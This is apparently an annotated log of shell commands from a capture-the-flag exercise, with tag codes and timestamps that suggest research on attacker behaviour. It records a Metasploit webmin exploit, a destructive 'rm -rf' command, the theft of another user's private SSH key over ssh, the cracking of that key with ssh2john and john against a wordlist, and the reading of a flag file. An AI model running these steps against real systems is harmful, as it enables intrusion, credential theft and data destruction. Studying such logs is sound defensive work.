INPUT|87--28|V3 |1594799990|87|search webmin|OUTPUT
INPUT|87--29|A4 |1594799993|87|use 3|OUTPUT
INPUT|87--30|V8 |1594800100|87|exploit|OUTPUT
INPUT|87--31|U|1594800785|87|ping rm /home/eve/* -rf|OUTPUT
INPUT|87--32|U|1594800785|87|logout|OUTPUT
INPUT|87--33|U|1594800785|87|ping 10.1.18.22|OUTPUT
INPUT|87--34|U|1594800791|87|ping 10.1.18.22|OUTPUT
INPUT|87--35|U|1594800797|87|exit|OUTPUT
INPUT|87--36|V5 |1594800858|87|show options|OUTPUT
INPUT|87--37|A16 |1594800874|87|ssh 172.18.1.5|OUTPUT
INPUT|87--38|A10 A16 |1594800928|87|ls ~/.ssh|OUTPUT
INPUT|87--39|A16 |1594800938|87|ssh-keygen|OUTPUT
INPUT|87--40|A10 |1594800949|87|ls|OUTPUT
INPUT|87--41|A10 A16 |1594800953|87|ls ~/.ssh|OUTPUT
INPUT|87--42|A16 |1594800959|87|cd ~/.ssh|OUTPUT
INPUT|87--43|A10 |1594800960|87|ls|OUTPUT
INPUT|87--44|A12 M12 A17 |1594800967|87|cat id_rsa.pub|OUTPUT
INPUT|87--45|A16 M16 |1594801072|87|ssh eve@172.18.1.5|OUTPUT
INPUT|87--46|U|1594801078|87|sessions 5|OUTPUT
INPUT|87--47|V16 |1594801163|87|ssh eve@10.1.17.4|OUTPUT
INPUT|87--48|A10 |1594801181|87|ls|OUTPUT
INPUT|87--49|A10 |1594801183|87|ls -la|OUTPUT
INPUT|87--50|A16 |1594801196|87|cd .ssh|OUTPUT
INPUT|87--51|A10 |1594801197|87|ls|OUTPUT
INPUT|87--52|V12 |1594801203|87|cat id_rsa|OUTPUT
INPUT|87--53|A10 |1594801266|87|ls|OUTPUT
INPUT|87--54|U|1594801313|87|vim key|OUTPUT
INPUT|87--55|V16 |1594801391|87|ssh eve@10.1.17.4 cat ~/.ssh/id_rsa|OUTPUT
INPUT|87--56|V16 |1594801423|87|ssh eve@172.18.1.5 cat ~/.ssh/id_rsa|OUTPUT
INPUT|87--57|V16 |1594801433|87|ssh eve@172.18.1.5 cat '~/.ssh/id_rsa'|OUTPUT
INPUT|87--58|V16 |1594801437|87|ssh eve@172.18.1.5 cat '~/.ssh/id_rsa' > key|OUTPUT
INPUT|87--59|A10 |1594801438|87|ls|OUTPUT
INPUT|87--60|A14 A16 |1594801447|87|.ssh2john.py|OUTPUT
INPUT|87--61|A14 A16 |1594801453|87|./ssh2john.py|OUTPUT
INPUT|87--62|A14 A16 |1594801459|87|./ssh2john.py key > crack.txt|OUTPUT
INPUT|87--63|A1 A9 A11 A12 A17 |1594801462|87|cat crack.txt|OUTPUT
INPUT|87--64|A10 |1594801478|87|ls|OUTPUT
INPUT|87--65|U|1594801499|87|cd Desktop/|OUTPUT
INPUT|87--66|A10 |1594801501|87|ls|OUTPUT
INPUT|87--67|A10 |1594801503|87|ls -la|OUTPUT
INPUT|87--68|U|1594801506|87|cd ..|OUTPUT
INPUT|87--69|A10 |1594801508|87|ls|OUTPUT
INPUT|87--70|A14 |1594801549|87|john crack.txt|OUTPUT
INPUT|87--71|U|1594801605|87|cd /usr/share|OUTPUT
INPUT|87--72|A10 |1594801606|87|ls|OUTPUT
INPUT|87--73|U|1594801613|87|cd wordlists/|OUTPUT
INPUT|87--74|A10 |1594801614|87|ls|OUTPUT
INPUT|87--75|A14 M14 |1594801647|87|john crack.txt --wordlist=/usr/share/wordlists/rockyou.txt|OUTPUT
INPUT|87--76|V16 |1594801742|87|ssh eve@10.1.17.4|OUTPUT
INPUT|87--77|U|1594801746|87|exit|OUTPUT
INPUT|87--78|A10 |1594801798|87|ls|OUTPUT
INPUT|87--79|U|1594801801|87|cd top-secret/|OUTPUT
INPUT|87--80|A10 |1594801802|87|ls|OUTPUT
INPUT|87--81|A17 M17 |1594801805|87|cat flag.txt|OUTPUT
